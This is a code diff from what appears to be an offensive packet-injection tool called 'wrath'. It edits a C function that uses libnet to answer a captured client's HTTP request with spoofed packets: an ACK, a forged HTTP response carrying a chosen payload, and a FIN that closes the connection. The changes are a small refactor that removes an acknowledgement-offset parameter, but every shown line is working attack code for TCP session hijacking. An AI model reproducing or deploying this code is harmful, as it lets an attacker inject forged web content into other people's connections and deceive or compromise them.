@@ -3,7 +3,7 @@
 #include "wrath-structs.h"
 
 /* This assumes packets are being filtered where the client is the source. */
-void wrath_launch_http_response(u_char *data_pass, const u_char *packet, u_char *payload, int ack_increment) {
+void wrath_launch_http_response(u_char *data_pass, const u_char *packet, u_char *payload) {
 	
 	struct lcp_package *package = (struct lcp_package *) data_pass;
 	libnet_t *libnet_handle = package->libnet_handle;
@@ -16,14 +16,14 @@ void wrath_launch_http_response(u_char *data_pass, const u_char *packet, u_char 
 
 	// acknowledges client's http request
 	wrath_tcp_custom_build_and_launch(libnet_handle, iphdr->ip_dst, iphdr->ip_src, ntohs(tcphdr->th_dport),
-		ntohs(tcphdr->th_sport), ntohl(tcphdr->th_ack), ntohl(tcphdr->th_seq) + 0, TH_ACK);
+		ntohs(tcphdr->th_sport), ntohl(tcphdr->th_ack), ntohl(tcphdr->th_seq), TH_ACK);
 
 	// launches forgered http response	
-	wrath_tcp_belly_build_and_launch(data_pass, packet, payload, (TH_PUSH + TH_ACK), 0);
+	wrath_tcp_belly_build_and_launch(data_pass, packet, payload, (TH_PUSH + TH_ACK));
 		
 	// requests a connection tear-down
 	wrath_tcp_custom_build_and_launch(libnet_handle, iphdr->ip_dst, iphdr->ip_src, ntohs(tcphdr->th_dport),
-		ntohs(tcphdr->th_sport), ntohl(tcphdr->th_ack) + strlen(payload), ntohl(tcphdr->th_seq) + 0, (TH_FIN + TH_ACK));
+		ntohs(tcphdr->th_sport), ntohl(tcphdr->th_ack) + strlen(payload), ntohl(tcphdr->th_seq), (TH_FIN + TH_ACK));
 
 
 }
